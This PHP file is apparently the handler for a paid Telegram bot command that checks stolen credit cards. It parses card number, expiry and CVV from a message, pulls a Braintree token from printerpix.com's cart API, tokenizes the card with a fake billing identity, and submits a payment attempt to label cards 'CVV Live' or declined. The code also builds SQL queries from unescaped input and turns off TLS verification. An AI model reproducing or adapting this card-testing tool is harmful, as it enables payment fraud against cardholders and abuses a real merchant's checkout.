<?php
if(strpos($message, '!btu') === 0 or strpos($message, '/btu') === 0 or strpos($message, '.btu') === 0){
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
if($role == 'USER'){
    reply_to($chatId,$message_id,$keyboard,$nopre);
    exit();
}elseif(empty($role)){
    reply_to($chatId,$message_id,$keyboard,$noreg);
    exit();
}
sendaction($chatId, typing);
$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = preg_replace(''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
$vaut = array(1,2,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
if($client < 5){ 
    reply_to($chatId, $message_id,$keyboard,$nocredits);
    exit();
}elseif(empty($client)){
    reply_to($chatId, $message_id,$keyboard,$noregister);
    exit();
}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");    
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
    $current = time();
    $sec = $current - $times;
    if($role == 'MEMBER' and $sec < 30){
    $after = 30 - $sec;
    $antispam = urlencode("<b>[ANTISPAM] <u> TRY AGAIN AFTER $after sec.</u></b>");
    reply_to($chatId,$message_id,$keyboard,$antispam);
    exit();
    }
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■□□□□ 20%[⬛] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");



/////// CHECKING SK KEY [PK_LIVE] REQUEST ///////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.printerpix.com/cart/api/initializeBraintree');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
"www.printerpix.com",
"User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
"Content-Type: application/json",
"Accept: application/json, text/plain, */*",
"Sec-Fetch-Site: cross-site",
"Sec-Fetch-Mode: cors",
"Sec-Fetch-Dest: empty",
"Referer: https://www.printerpix.com/cart/payment",
"Accept-Language: en-GB,en-US;q=0.9,en;q=0.8",
));
 $curl1 = curl_exec($ch);
 $token1 = trim(strip_tags(getStr($curl1,'data":"','"')));
 $dec = base64_decode($token1);
 $bearer = trim(strip_tags(getStr($dec,'authorizationFingerprint":"','"')));

edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[⬜] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
"Host: payments.braintree-api.com",
 'Authorization: Bearer '.$bearer.'',
"User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
"Braintree-Version: 2018-05-10",
"Content-Type: application/json",
"Accept: */*",
"Origin: https://assets.braintreegateway.com",
"Sec-Fetch-Site: cross-site",
"Sec-Fetch-Mode: cors",
"Sec-Fetch-Dest: empty",
"Referer: https://assets.braintreegateway.com/",
"Accept-Language: en-GB,en-US;q=0.9,en;q=0.8",
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"394da68b-fc47-4c76-83b8-8f3f817307b2"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"Alsn Leno","billingAddress":{"company":"","countryName":"United States","extendedAddress":"addressGuid : 11edce34-72d8-4784-ba1d-a1e0cb085d21, regionGuid: 8f21c5b9-33af-4acc-a4b1-eb93b6163e67, countryGuid: 80533730-cab7-4c17-b509-5e6ce6b5ad00","locality":"Montpelier","region":"Vermont","firstName":"Alsn","lastName":"Leno","postalCode":"05602-4501","streetAddress":"31 Stretchs Way"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 $curl = curl_exec($ch);
 $token = trim(strip_tags(getStr($curl,'token":"','"')));
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.printerpix.com/cart/api/paymentByBraintree');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
"Host: www.printerpix.com",
"accept: application/json, text/plain, */*",
"user-agent: Mozilla/5.0 (Linux; Android 8.1.0; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
"content-type: application/json;charset=UTF-8",
"origin: https://www.printerpix.com",
"sec-fetch-site: same-site",
"sec-fetch-mode: cors",
"sec-fetch-dest: empty",
"referer: https://www.printerpix.com/cart/payment",
"accept-language: en-GB,en-US;q=0.9,en;q=0.8",
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"nonce":"'.$token.'","amount":"41.47","OrderID":"63881139","machine_name":"printerpixus14","customer_guid":"7074355e-13a5-4ccc-90f2-1485d29703ee","customer_ip":"153.92.0.18","payload_type":"NEWCARD","deviceData":"{\"device_session_id\":\"e1e9694d61141f2a11610876dccc1347\",\"fraud_merchant_id\":null,\"correlation_id\":\"60fe05baae721ce4608922613c559aea\"}"}');
 $curl1 = curl_exec($ch);
 $result = curl_exec($ch);
 $msg = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'message":"','"')))));
 $status = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'status":"','"')))));
 $cvvres = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'cvvResponseCode":"','"')))));
 $avsp = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'avsPostalCodeResponseCode":"','"')))));
 $avss = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'avsStreetAddressResponseCode":"','"')))));
 $code = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'processorResponseCode":"','"')))));
 $codetxt = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'processorResponseText":"','"')))));
 $additional = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'additionalProcessorResponse":"','"')))));
 $prorestext = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'processorResponseType":"','"')))));
 $vbv = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'threeDSecureInfo":',',')))));
curl_close($ch);
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■□ 80%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$cod = array(1000,1002,1003,1004);
if (in_array($code, $cod)){
  $msg = 'Approved ✅';
  $status = 'CVV Live';
  $code = 'Between 1000 or 1004';
  cvv($list);
}elseif($code == 2001){
  ccn($list);
}elseif($code == 2000){
  cvv($list);
}elseif(strpos($result, 'risk_threshold')){
  $msg = 'Approved ✅';
  $status = 'CVV Live(risk_threshold)';
  $code = 'NOTE SURE';
  }
if(empty($result) or empty($msg) or empty($status)){
sendMessage1($result);
sendMessage1($list);
$result = urlencode("<b>
GATE --> <i>BRAINTREE</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> Unknown error
Message ->> Try Again
AVSP ->> .. || AVSS ->> ..
Code ->> ..
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");


$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
    $balance = $client - 5;

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
    $result = mysqli_query($link, $sql);
mysqli_close($link);

$result = urlencode("<b>
GATE --> <i>BRAINTREE</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> $status
Message ->> $msg
AVSP ->> $avsp || AVSS ->> $avss
Code ->> ${code}
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Credit Left ->> ${balance}💰
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
rest($lista);
        $timest = time(); 

$link = mysqli_connect("localhost", "root", "", "demo");
$sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
$result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}
?>